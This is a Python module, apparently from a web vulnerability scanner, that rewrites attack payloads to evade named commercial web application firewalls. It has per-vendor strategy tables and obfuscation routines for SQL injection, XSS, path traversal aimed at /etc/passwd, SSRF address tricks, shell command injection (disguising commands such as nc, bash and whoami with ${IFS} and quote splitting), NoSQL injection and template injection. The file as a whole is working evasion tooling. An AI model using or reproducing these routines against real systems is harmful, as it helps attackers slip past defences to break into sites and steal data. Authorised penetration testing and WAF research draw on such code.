import re
import random
import socket
import struct
from urllib.parse import quote

WAF_STRATEGIES = {
    'Cloudflare': {
        'sqli_space': ["/*+*/", "%0A", "%09", "+", "%20"],
        'sqli_keywords': 'case_toggle',
        'xss_tags': 'newline_insertion',
        'cmdi_space': 'ifs_quotes',
        'lfi_encoding': 'double_url'
    },
    'AWS WAF': {
        'sqli_space': ["%09", "%0A", "+", "%0C"],
        'sqli_keywords': 'case_toggle',
        'xss_tags': 'html_entities',
        'cmdi_space': 'tab_backslash',
        'lfi_encoding': 'nested'
    },
    'Azure WAF (App Gateway)': {
        'sqli_space': ["/**/", "%0A", "%0D"],
        'sqli_keywords': 'comment_split',
        'xss_tags': 'junk_attributes',
        'lfi_encoding': 'utf8_overflow'
    },
    'Akamai': {
        'sqli_space': ["%09", "+"],
        'sqli_keywords': 'concat',
        'xss_tags': 'random_case',
        'lfi_slashes': 'double_slash'
    },
    'Sucuri': {
        'sqli_space': ["%20", "/**/"],
        'sqli_keywords': 'versioned',
        'xss_tags': 'unicode_escape',
        'lfi_encoding': 'url_encode'
    },
    'ModSecurity (OWASP CRS)': {
        'sqli_space': ["/*!50000*/", "/**/", "%0B"],
        'sqli_keywords': 'comment_split',
        'xss_tags': 'double_encode',
        'lfi_encoding': 'utf8_overflow'
    },
    'F5 BIG-IP ASM': {
        'sqli_space': ["%20", "+"],
        'sqli_keywords': 'hex_encode',
        'xss_tags': 'junk_attributes',
        'lfi_slashes': 'path_truncation'
    },
    'Citrix NetScaler': {
        'sqli_space': ["%0A", "%0D", "%00"],
        'sqli_keywords': 'case_toggle',
        'xss_tags': 'html_entities',
        'lfi_encoding': 'double_url'
    },
    'Barracuda': {
        'sqli_space': ["/**/", "+"],
        'sqli_keywords': 'comment_split',
        'xss_tags': 'random_case',
        'lfi_encoding': 'nested'
    },
    'Palo Alto (Prisma)': {
        'sqli_space': ["%20", "%09"],
        'sqli_keywords': 'concat',
        'xss_tags': 'whitespace',
        'cmdi_space': 'redirect_var'
    },
    'Fortinet (FortiWeb)': {
        'sqli_space': ["%09", "+"],
        'sqli_keywords': 'hex_encode',
        'xss_tags': 'junk_attributes',
        'lfi_encoding': 'double_slash'
    },
    'Wordfence': {
        'sqli_space': ["/*!*/", "%0A"],
        'sqli_keywords': 'versioned',
        'xss_tags': 'double_encode',
        'lfi_encoding': 'nested'
    },
    'Default': {
        'sqli_space': ["/**/", "+", "%09", "%0A", "%0C", "%0B"],
        'sqli_keywords': 'random',
        'xss_tags': 'random',
        'cmdi_space': 'random',
        'lfi_encoding': 'random'
    }
}

SQLI_TECHNIQUES = ['case_toggle', 'comment_split', 'versioned', 'concat', 'hex_encode']
XSS_TECHNIQUES = ['case', 'newline', 'html', 'unicode', 'junk']
LFI_TECHNIQUES = ['double', 'utf8', 'nested', 'null', 'truncate', 'simple_url']
CMDI_TECHNIQUES = ['ifs_quotes', 'tab_backslash', 'redirect_var', 'concat_chars']
SSRF_TECHNIQUES = ['decimal_ip', 'octal_ip', 'hex_ip', 'dotted_hex_ip', 'case_scheme']
SSTI_TECHNIQUES = ['spacing', 'concat_keywords', 'hex_attr', 'alt_delim']
NOSQLI_TECHNIQUES = ['comment_pad', 'unicode_operator', 'space_padding', 'percent_dollar']


def get_strategy(waf_name):
    if not waf_name:
        return WAF_STRATEGIES['Default']
    for key in WAF_STRATEGIES:
        if key.lower() in waf_name.lower():
            return WAF_STRATEGIES[key]
    return WAF_STRATEGIES['Default']


def random_case(s):
    return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)


def to_hex(s):
    return "0x" + s.encode().hex()


def path_obfuscate(payload):
    res = payload
    if "../" in res:
        res = res.replace("/", "%5c").replace(".", "%2e")
    return res


def sql_obfuscate(payload, strategy, technique=None):
    spaces = strategy.get('sqli_space', ["/**/", "+", "%09", "%0A", "%0C", "%0D", "/*+*/"])
    chosen_space = random.choice(spaces)
    payload = payload.replace(" ", chosen_space)

    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'GROUP', 'SLEEP', 'BENCHMARK', 'WAITFOR', 'DELAY']
    tech = technique or strategy.get('sqli_keywords', 'random')

    if tech == 'random':
        tech = random.choice(SQLI_TECHNIQUES)

    for kw in keywords:
        if kw in payload.upper():
            if tech == 'case_toggle':
                payload = re.sub(kw, random_case(kw), payload, flags=re.IGNORECASE)
            elif tech == 'comment_split':
                mid = random.randint(1, len(kw) - 1)
                obf_kw = kw[:mid] + "/**/" + kw[mid:]
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
            elif tech == 'versioned':
                obf_kw = f"/*!50000{random_case(kw)}*/"
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
            elif tech == 'concat':
                mid = len(kw) // 2
                if random.choice([True, False]):
                    obf_kw = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                else:
                    obf_kw = f"'{kw[:mid]}'||'{kw[mid:]}'"
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
            elif tech == 'hex_encode':
                pass

    if "'" in payload and tech == 'hex_encode':
        def hex_replacer(match):
            return to_hex(match.group(1))
        payload = re.sub(r"'(\w+)'", hex_replacer, payload)

    return payload


def xss_obfuscate(payload, strategy, technique=None):
    tech = technique or strategy.get('xss_tags', 'random')
    if tech == 'random':
        tech = random.choice(XSS_TECHNIQUES)

    if tech in ('newline', 'newline_insertion'):
        payload = re.sub(r'<([a-z]+)', lambda m: '<' + m.group(1)[:1] + '%0A' + m.group(1)[1:], payload, flags=re.IGNORECASE)
    elif tech in ('html', 'html_entities'):
        payload = payload.replace("<", "&lt;").replace(">", "&gt;")
    elif tech == 'unicode':
        payload = payload.replace("<", "\\u003c").replace(">", "\\u003e")
    elif tech == 'junk' or tech == 'junk_attributes':
        payload = re.sub(r'<([a-z]+)>', r'<\1/ \t>', payload, flags=re.IGNORECASE)
    else:
        payload = re.sub(r'<([a-z]+)', lambda m: '<' + random_case(m.group(1)), payload, flags=re.IGNORECASE)

    payload = payload.replace("=", random.choice(["=", "\t=", "%09=", " = ", "%0A="]))

    if "alert" in payload:
        subs = ["alert", "window['alert']", "self['alert']", "top['alert']", "\\u0061lert"]
        payload = payload.replace("alert", random.choice(subs))

    if "(" in payload:
        payload = payload.replace("(", random.choice(["(", "&#40;", "%28"]))
        payload = payload.replace(")", random.choice([")", "&#41;", "%29"]))

    payload = payload.replace("'", "\\u0027").replace('"', "\\u0022")

    return payload


def lfi_obfuscate(payload, strategy, technique=None):
    tech = technique or strategy.get('lfi_encoding', 'random')
    if tech == 'random':
        tech = random.choice(LFI_TECHNIQUES)

    if "/" not in payload:
        if tech == 'null':
            return payload + "%00"
        return payload

    if tech == 'nested':
        payload = payload.replace("../", "....//")
        payload = payload.replace("..\\", "....\\\\")
    elif tech == 'double' or tech == 'double_url':
        payload = payload.replace("/", "%252f").replace("\\", "%255c")
        payload = payload.replace(".", "%252e")
    elif tech == 'utf8' or tech == 'utf8_overflow':
        payload = payload.replace("/", "%c0%af")
        payload = payload.replace(".", "%c0%ae")
    elif tech == 'simple_url' or tech == 'url_encode':
        payload = payload.replace("/", "%2f").replace(".", "%2e")

    if tech == 'truncate':
        payload = payload + "." * 200
    elif tech == 'null':
        if "%00" not in payload:
            payload += "%00"

    if "/etc/passwd" in payload and "php://" not in payload:
        if random.choice([True, False]):
            payload = payload.replace("/etc/passwd", "php://filter/resource=/etc/passwd")

    return payload


def ip_to_dword(ip):
    try:
        packed = socket.inet_aton(ip)
        return struct.unpack("!L", packed)[0]
    except Exception:
        return ip


def ssrf_obfuscate(payload, strategy=None, technique=None):
    if "wafmap-callback.test" in payload or "callback.wafmap.test" in payload:
        return payload

    tech = technique or 'random'
    if tech == 'random':
        tech = random.choice(SSRF_TECHNIQUES)

    result = payload
    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', result)

    if ip_match and tech in ('decimal_ip', 'octal_ip', 'hex_ip', 'dotted_hex_ip'):
        ip = ip_match.group(1)
        if tech == 'decimal_ip':
            new_ip = str(ip_to_dword(ip))
        elif tech == 'octal_ip':
            new_ip = '.'.join([format(int(x), '04o') for x in ip.split('.')])
        elif tech == 'hex_ip':
            new_ip = hex(ip_to_dword(ip))
        else:
            new_ip = '.'.join([hex(int(x)) for x in ip.split('.')])
        result = result.replace(ip, new_ip)
    elif "localhost" in result:
        shortcuts = {"decimal_ip": "0", "octal_ip": "0177.0.0.1", "hex_ip": "0x7f.0.0.1", "dotted_hex_ip": "127.1"}
        result = result.replace("localhost", shortcuts.get(tech, "127.1"))

    if tech == 'case_scheme' or not ip_match:
        result = re.sub(r'http://', 'hTTp://', result, flags=re.IGNORECASE)
        if "://" in result and "@" not in result:
            result = result.replace("://", "://0@", 1)

    return result


def cmdi_obfuscate(payload, strategy=None, technique=None):
    if "wafmap-callback.test" in payload:
        return payload

    is_windows = "\\" in payload or "type" in payload.lower() or ("ping" in payload and "-n" in payload)

    if is_windows:
        res = ""
        for i, char in enumerate(payload):
            if char == " ":
                res += char
            elif i % 2 == 0:
                res += "^" + char
            else:
                res += char
        return random_case(res)

    tech = technique or (strategy.get('cmdi_space') if strategy else None) or 'random'
    if tech == 'random':
        tech = random.choice(CMDI_TECHNIQUES)

    read_cmds = ["cat ", "head ", "tac ", "more ", "less "]
    is_read_cmd = any(c in payload for c in read_cmds)

    space_map = {
        'ifs_quotes': "${IFS}",
        'tab_backslash': "%09",
        'redirect_var': "<" if is_read_cmd else "$IFS$9",
        'concat_chars': "${IFS}",
    }
    chosen_space = space_map.get(tech, "${IFS}")
    if " " in payload:
        payload = payload.replace(" ", chosen_space)

    keywords = ['cat', 'whoami', 'id', 'ls', 'ping', 'nc', 'python', 'bash', 'sh', 'uname', 'echo']
    for kw in keywords:
        if kw in payload:
            if tech == 'ifs_quotes' and len(kw) > 1:
                idx = len(kw) // 2
                payload = payload.replace(kw, kw[:idx] + "''" + kw[idx:])
            elif tech == 'tab_backslash' and len(kw) > 1:
                idx = len(kw) // 2
                payload = payload.replace(kw, kw[:idx] + "\\" + kw[idx:])
            elif tech == 'redirect_var' and len(kw) > 1:
                idx = len(kw) // 2
                payload = payload.replace(kw, kw[:idx] + "$@" + kw[idx:])
            elif tech == 'concat_chars':
                obf_kw = "".join(f"'{c}'" for c in kw)
                payload = payload.replace(kw, obf_kw)

    if payload.strip() in ['id', 'whoami', 'ls', 'pwd']:
        payload = f"$({payload.strip()})"

    if "/" in payload and tech == 'redirect_var':
        def glob_replace(match):
            s = match.group(0)
            if len(s) <= 2:
                return s
            chars = list(s)
            mid = len(chars) // 2
            if chars[mid].isalnum():
                chars[mid] = '?'
            return "".join(chars)
        payload = re.sub(r'/[a-zA-Z0-9._-]+', glob_replace, payload)

    return payload


def nosqli_obfuscate(payload, strategy=None, technique=None):
    tech = technique or 'random'
    if tech == 'random':
        tech = random.choice(NOSQLI_TECHNIQUES)

    result = payload

    if tech == 'comment_pad':
        result = result.replace("||", "/*a*/||/*b*/").replace("==", "/*a*/==/*b*/")
    elif tech == 'unicode_operator':
        for op in ["$ne", "$gt", "$lt", "$where", "$regex", "$exists"]:
            if op in result:
                result = result.replace(op, "\\u0024" + op[1:])
    elif tech == 'space_padding':
        result = result.replace(":", " : ").replace("{", "{ ").replace(",", " , ")
    elif tech == 'percent_dollar':
        result = result.replace("$", "%24")

    return result


def ssti_obfuscate(payload, strategy=None, technique=None):
    tech = technique or 'random'
    if tech == 'random':
        tech = random.choice(SSTI_TECHNIQUES)

    result = payload

    if tech == 'spacing':
        result = result.replace("{{", "{{ ").replace("}}", " }}")
    elif tech == 'concat_keywords':
        for kw in ['class', 'config', 'self', 'globals', 'import', 'popen', 'builtins']:
            if kw in result:
                mid = len(kw) // 2
                result = result.replace(kw, f"'{kw[:mid]}'+'{kw[mid:]}'")
    elif tech == 'hex_attr':
        for kw in ['class', 'config', '__globals__', '__builtins__']:
            if kw in result:
                hex_kw = "".join(f"\\x{ord(c):02x}" for c in kw)
                result = result.replace(kw, hex_kw)
    elif tech == 'alt_delim':
        result = result.replace("{{", "${").replace("}}", "}")

    return result


def _wire_safe(payload):
    return (payload.replace('\r', '%0D')
                    .replace('\n', '%0A')
                    .replace(' ', '%20')
                    .replace('&', '%26')
                    .replace('#', '%23'))


def apply_tampering(payload, vtype, enabled, waf_name=None, technique=None):
    if not enabled:
        return payload

    strategy = get_strategy(waf_name)

    res = payload
    if vtype == 'sqli':
        res = sql_obfuscate(res, strategy, technique=technique)
    elif vtype == 'xss':
        res = xss_obfuscate(res, strategy, technique=technique)
    elif vtype == 'lfi':
        res = lfi_obfuscate(res, strategy, technique=technique)
    elif vtype == 'ssrf':
        res = ssrf_obfuscate(res, strategy, technique=technique)
    elif vtype == 'ssti':
        res = ssti_obfuscate(res, strategy, technique=technique)
    elif vtype == 'cmdi':
        res = cmdi_obfuscate(res, strategy, technique=technique)
    elif vtype == 'nosqli':
        res = nosqli_obfuscate(res, strategy, technique=technique)

    if vtype in ('lfi', 'xss', 'ssrf'):
        res = path_obfuscate(res)

    return _wire_safe(res)
